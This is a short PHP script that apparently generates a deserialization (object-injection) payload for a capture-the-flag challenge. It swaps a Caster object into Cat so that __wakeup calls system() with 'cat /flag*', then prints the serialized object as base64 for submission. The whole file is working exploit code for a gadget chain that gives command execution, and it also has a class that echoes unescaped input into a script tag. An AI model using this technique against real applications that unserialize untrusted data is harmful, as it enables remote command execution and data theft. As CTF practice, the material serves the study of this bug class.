<?php

class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'system';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}

$cat = new Cat("cat /flag*");
$cat->magic = new Caster();
var_dump($cat);
echo base64_encode(serialize($cat));

?>